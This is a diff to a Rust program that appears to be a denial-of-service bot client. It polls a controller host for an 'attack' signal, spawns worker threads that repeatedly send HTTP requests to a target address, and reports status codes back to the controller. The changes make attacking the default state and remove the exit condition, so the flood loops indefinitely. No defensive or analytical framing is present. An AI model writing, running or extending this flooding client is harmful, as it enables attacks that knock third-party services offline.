@@ -30,7 +30,7 @@ impl Worker {
             let code = res.status().as_u16();
             let body = res.text().unwrap();
             let response_body = serde_json::json!({"code": code, "body":body});
-            println!("{}", response_body);
+            // println!("{}", response_body);
             self.client.post(self.host_address.as_str()).json(&response_body).send().unwrap();
             return 0;
         }
@@ -40,8 +40,9 @@ impl Worker {
 
 impl Client {
     fn new(host: String, addr: String) -> Client {
-        let mut cl = Client { host_address: host, address: addr, attacking: false, workers: vec![], worker_threads: vec![] };
-        let thread_count = (std::thread::available_parallelism().unwrap().get())*4;
+        let mut cl = Client { host_address: host, address: addr, attacking: true, workers: vec![], worker_threads: vec![] };
+        // let thread_count = std::thread::available_parallelism().unwrap().get();
+        let thread_count = 4;
         cl.worker_threads.reserve(thread_count);
         for _ in 0..thread_count {
             cl.workers.push(Arc::new((
@@ -58,8 +59,10 @@ impl Client {
         let url = self.host_address.as_str();
         let req = reqwest::blocking::get(url).unwrap().text().unwrap();
         if req == String::from("true") {
+            println!("can attack");
             self.attacking = true;
             for el in self.workers.iter_mut() {
+                println!("main thread command: huh?");
                 let clone_el = el.clone();
                 let (elem, cv) = &*clone_el;
                 let mut worker = elem.lock().unwrap();
@@ -67,29 +70,31 @@ impl Client {
                 cv.notify_one();
             }
         } else {
+            println!("can't attack");
             self.attacking = false;
             for el in self.workers.iter_mut() {
                 let clone_el = el.clone();
+                println!("main thread command: is to stop");
                 let (elem, cv) = &*clone_el;
                 let mut worker = elem.lock().unwrap();
                 worker.attacking = false;
-                let mut var = false;
-                while !var {
-                    worker = cv.wait(worker).unwrap();
-                    var = worker.attacking;
-                }
             }
         }
     }
 
     fn thread_worker(worker: Arc<(Mutex<Worker>, Condvar)>){
+        let el = worker.clone();
+        let (elem, cv) = &*el;
         loop {
-            let el = worker.clone();
-            let (elem, _) = &*el;
-            let w = elem.lock().unwrap();
-            println!("{}", w.attacking);
+            let mut w = elem.lock().unwrap();
+            if !w.attacking {
+                w = cv.wait_while(w, |w| !w.attacking).unwrap();
+            }
+            else {
+                cv.notify_one();
+            }
             let mut _r = 0;
-            for _ in 0..20 {
+            for _ in 0..5 {
                 _r = w.start_requesting();
             }
         }
@@ -104,26 +109,21 @@ impl Client {
             self.worker_threads.push(std::thread::spawn(move || {
                 Client::thread_worker(worker);
             }));
+            println!("worker thread {}", ind);
             i += 1;
         }
-        let mut fail_count: u32 = 0;
+        println!("main thread finished creating");
+        self.can_attack();
         loop {
+            println!("hello from main thread infinite loop");
             let mut j = 0;
-            while j < 20 {
+            while j < 5 {
                 if self.attacking {
                     let _ = reqwest::blocking::get(self.address.to_owned().as_str());
                 }
                 j += 1;
             }
             self.can_attack();
-            if !self.attacking {
-                fail_count += 1;
-            } else {
-                fail_count = 0;
-            }
-            if fail_count == 5 {
-                break;
-            }
         }
         while self.worker_threads.len()>0 {
             let thread= self.worker_threads.pop().unwrap();
